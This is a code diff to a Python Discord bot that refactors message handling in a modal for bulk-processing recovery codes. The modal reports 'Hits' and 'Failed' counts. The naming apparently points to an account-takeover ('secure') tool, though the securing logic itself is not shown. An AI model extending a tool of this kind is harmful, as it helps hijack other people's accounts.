@@ -4,6 +4,7 @@ import discord
 from securing.recovery_secure import recovery_secure
 from ui.modals.bulk_utils import run_bulk_parallel
 
+from shared import interactions
 
 class BulkRecoveryCodeModal(ui.Modal):
     def __init__(self):
@@ -16,7 +17,7 @@ class BulkRecoveryCodeModal(ui.Modal):
         ))
 
     async def callback(self, interaction: discord.Interaction):
-        await interaction.response.defer(ephemeral=True)
+        await interactions.defer(interaction, ephemeral=True)
 
         lines = self.children[0].value.strip().splitlines()
         jobs: list[tuple[str, object]] = []
@@ -51,7 +52,7 @@ class BulkRecoveryCodeModal(ui.Modal):
             ),
             color=0x2765F5,
         )
-        processing_msg = await interaction.followup.send(embed=processing_embed, ephemeral=True)
+        processing_msg = await interactions.followup_message(interaction, embed=processing_embed, ephemeral=True)
 
         hits = 0
         try:
@@ -87,20 +88,26 @@ class BulkRecoveryCodeModal(ui.Modal):
                     inline=False,
                 )
 
-            try:
-                await processing_msg.edit(embed=summary_embed)
-            except discord.HTTPException:
+            summary_sent = False
+            if processing_msg is not None:
                 try:
-                    await interaction.followup.send(embed=summary_embed, ephemeral=True)
+                    await processing_msg.edit(embed=summary_embed)
+                    summary_sent = True
+                except discord.HTTPException:
+                    summary_sent = False
+            if not summary_sent:
+                try:
+                    await interactions.followup(interaction, embed=summary_embed, ephemeral=True)
                 except discord.HTTPException:
                     # Last resort — counts only, no failed list
                     tiny = discord.Embed(
                         title="Bulk Secure Complete",
                         description=(
-                            f"Processed **{hits + failures}** · "
-                            f"Hits **{hits}** · Failed **{failures}**\n"
+                            f"Processed **{hits + failures}** — "
+                            f"Hits **{hits}** — Failed **{failures}**\n"
                             f"(Failed list omitted — check DMs for details.)"
                         ),
                         color=0x2765F5,
                     )
-                    await interaction.followup.send(embed=tiny, ephemeral=True)
+                    await interactions.followup(interaction, embed=tiny, ephemeral=True)
+
